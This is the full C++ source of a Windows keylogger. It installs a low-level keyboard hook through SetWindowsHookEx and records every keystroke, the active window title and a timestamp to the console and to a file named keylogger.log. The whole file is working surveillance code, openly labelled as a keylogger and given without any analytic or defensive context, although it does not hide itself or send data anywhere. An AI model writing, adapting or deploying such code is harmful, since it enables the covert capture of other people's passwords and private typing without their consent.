#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <windows.h>
#include "keymapping.h"

LRESULT CALLBACK hookCallback(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam);
std::string getForegroundWindowName();
std::string getFormatedSystemTime();
void writeToFile(std::string str);

std::string privWindow = "";
std::ofstream output_file;
const char* output_filename = "keylogger.log";

int main()
{
    HHOOK hook;
    // set keyboard hook
    if((hook = SetWindowsHookEx(WH_KEYBOARD_LL, hookCallback, NULL, 0)) == NULL)
    {
        // hook failed
        std::cout << "Failed to set hook" << std::endl;
        return 1;
    }

	std::cout << "Log file: " << output_filename << std::endl;
    output_file.open(output_filename, std::ios_base::app);

    // message loop
    MSG msg;
    BOOL bRet;
    while((bRet = GetMessage(&msg, NULL, 0, 0)) != 0)
    { 
        if (bRet == -1)
        {
            // handle the error and possibly exit
        }
        else
        {
            TranslateMessage(&msg); 
            DispatchMessage(&msg); 
        }
    }
}

LRESULT CALLBACK hookCallback(
  _In_ int    nCode,
  _In_ WPARAM wParam,
  _In_ LPARAM lParam
)
{
    std::stringstream outputStr;

    if(nCode >= 0 && wParam == WM_KEYDOWN)
    {
        DWORD vkCode = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;

        // get foreground window name
        std::string fgWindowName = getForegroundWindowName();
        if(fgWindowName != privWindow)
        {
            privWindow = fgWindowName;
            outputStr << std::endl;

            // log new window
            outputStr << getFormatedSystemTime() << " ";
            outputStr << "[Window: " << fgWindowName << "] ";
        }

        outputStr << keymap[vkCode];
        std::cout << outputStr.str();

        // write to file
        writeToFile(outputStr.str());
    }
    
    // send key to original program
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

std::string getForegroundWindowName()
{
    char window_title[256];
    HWND handle = GetForegroundWindow();
    GetWindowText(handle, (LPSTR)window_title, sizeof(window_title));
    return std::string(window_title);
}

std::string getFormatedSystemTime()
{
    std::stringstream formatStr;
    SYSTEMTIME st;
    GetSystemTime(&st);

    formatStr << st.wYear << "/" << st.wMonth << "/" << st.wDay;
    formatStr << " " << st.wHour << ":" << st.wMinute << ":" << st.wSecond;
    return formatStr.str();
}

void writeToFile(std::string str)
{
    output_file << str;
    output_file.flush();
}